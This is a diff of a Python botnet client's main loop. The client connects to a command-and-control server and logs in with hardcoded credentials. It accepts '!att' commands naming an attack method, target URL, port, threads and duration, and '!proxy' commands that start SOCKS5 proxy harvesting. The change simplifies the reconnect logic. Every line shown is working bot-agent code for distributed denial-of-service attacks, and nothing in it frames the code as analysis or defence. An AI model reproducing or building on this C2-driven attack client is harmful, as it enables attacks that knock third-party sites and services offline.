@@ -276,68 +276,40 @@ def socks5geter():
     pf.close()
 
 def main():
-    while True:
-        s = None
-        connected = False
-        while not connected:
-            try:
-                s = socket(AF_INET, SOCK_STREAM)
-                s.connect((ipc2, portc2))
-                print("VPN connected.")
-                connected = True 
-                while True:
-                    data = s.recv(1024)
-                    if b"Username" in data:
-                        s.send("kediam".encode())
-                        break
-                while True:
-                    data = s.recv(1024)
-                    if b"Password" in data:
-                        s.send("FSOCIETY".encode())
-                        break
-            except Exception as e:
-                if s:
-                    try:
-                        s.close()
-                    except:
-                        pass
-                s = None
-                sleep(5)
+    s = socket(AF_INET , SOCK_STREAM)
+    while 1:
         try:
-            while True:
-                try:
-                    data = s.recv(1024)
-                    if not data:
-                        raise ConnectionResetError("Connection closed by server.")
-                    try:
-                        c2 = data.decode('utf-8', errors='ignore').strip()
-                    except UnicodeDecodeError as e:
-                        continue
-
-                    if c2.split()[0] == '!att':
-                        print(c2)
-                        method = str(c2.split()[1])
-                        url = str(c2.split()[2])
-                        port = int(c2.split()[3])
-                        threads = int(c2.split()[4])
-                        rpc = int(c2.split()[5])
-                        timme = int(c2.split()[6])
-                        timer = time() + timme
-                    elif c2.split()[0] == '!proxy':
-                        thr(target=socks5geter).start()
-                except Exception as e:
+            s.connect((ipc2 , portc2))
+            print('vpn connected')
+            sleep(0.5)
+            while 1:
+                data = s.recv(1024).decode()
+                if "Username" in data:
+                    s.send("kediam".encode())
                     break
+            while 1:
+                data = s.recv(1024).decode()
+                if "Password" in data:
+                    s.send("FSOCIETY".encode())
+                    break
+            break
+        except:
+            sleep(5)
+    while True:
+        try:
+            c2 = s.recv(1024).decode().strip()
+            if c2.split()[0] == '!att':
+                method = str(c2.split()[1])
+                url = str(c2.split()[2])
+                port = int(c2.split()[3])
+                threads = int(c2.split()[4])
+                rpc = int(c2.split()[5])
+                timme = int(c2.split()[6])
+                timer = time() + timme
+            elif c2.split()[0] == '!proxy':
+                thr(target=socks5geter).start()
         except:
             pass
-
-        finally:
-            if s:
-                try:
-                    s.close()
-                except:
-                    pass
-            connected = False
-            sleep(5)
 
         try:
             us = UserAgent()
